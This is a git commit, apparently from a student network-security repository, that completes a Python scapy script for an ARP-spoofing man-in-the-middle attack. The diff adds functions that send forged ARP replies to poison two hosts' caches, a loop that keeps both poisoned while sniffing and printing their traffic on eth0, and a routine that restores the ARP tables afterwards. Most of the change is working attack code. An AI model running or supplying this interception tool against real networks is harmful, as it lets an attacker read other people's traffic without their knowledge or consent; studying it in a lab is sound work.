bc3d18c2760cfe25b80ee641aed7ff77fbafac47
Alexantoun <oz.antoun@gmail.com>
2022-11-08 23:57:12 -0500

    completed MITM script

--- Network-Security/mitm/mitm_scapy.py
+++ Network-Security/mitm/mitm_scapy.py
@@ -19,22 +19,40 @@ def getMAC(ip): #Ether has 3 fields, 2 of those are dst and src, which contain t
         print(ans[Ether].src)
         return ans[Ether].src
 
-def spoof_target(target_IP, target_MAC, spoof_ipv4):
-    packet = ARP
+    #Set fields of an arp packet, and send it
+def spoof_target(target_ipv4, target_MAC, spoof_ipv4): #This will convince target to send me their packets
+    packet = ARP()
+    packet.op = 2 #two is enumeration for "reply", 1 would be for "request"
+    packet.psrc = spoof_ipv4 #convince target 
+    packet.hwdst = target_MAC
+    packet.pdst = target_ipv4
+    send(packet)
 
+def unspoof(dest_IP, dest_mac, src_IP, src_mac):
+    packet = ARP(op =2, pdst = dest_IP, hwdst = dest_mac, psrc = src_IP, hwsrc = src_mac)
+    send(packet, verbose=False)
 
-def main(target_IP:str, host_IP:str):
-    print(f'Target IP = {target_IP}, host IP = {host_IP}\n')
-    victim = getMAC(target_IP)
-    host = getMAC(host_IP)
-
-    # # victim.show()
-    # host = getMAC(host_IP)
-    # print(f'Mac of host device is: {host}')
+def main(machine_IP:str, host_IP:str):
+    print(f'Machine IP = {machine_IP}, host IP = {host_IP}\n')
+    machine_MAC = getMAC(machine_IP)
+    host_MAC = getMAC(host_IP)
+    try:
+        while(True): #Prevents my desired settings from being overwritten by defaults
+            spoof_target(machine_IP, machine_MAC, host_IP)
+            spoof_target(host_IP, host_MAC, machine_IP)
+            print("\nMachine sending packet: ")
+            sniff(iface="eth0", filter=f"not arp and host {machine_IP}", prn=lambda x: x.show(), store=False, timeout=1)
+            print("\nHost sending packet: ")
+            sniff(iface="eth0", filter=f"not arp and host {host_IP}", prn=lambda x: x.show(), store=False, timeout=1)
+    except KeyboardInterrupt:
+        print("\nUser stopped execution")
+    unspoof(host_IP, host_MAC, machine_IP, machine_MAC)
+    unspoof(machine_IP, machine_MAC, host_IP, host_MAC)
+    print('Unspoofed target and host')
 
 if __name__ == '__main__':
     conf.iface = "eth0"
-    if len(sys.argv) < 3:
+    if len(sys.argv) != 3:
         print(f'Missing arguments, need 2 but got {len(sys.argv)-1}')
     elif sys.argv[1] == sys.argv[2]:
         print("Cannot target two identical IPv4 addresses")
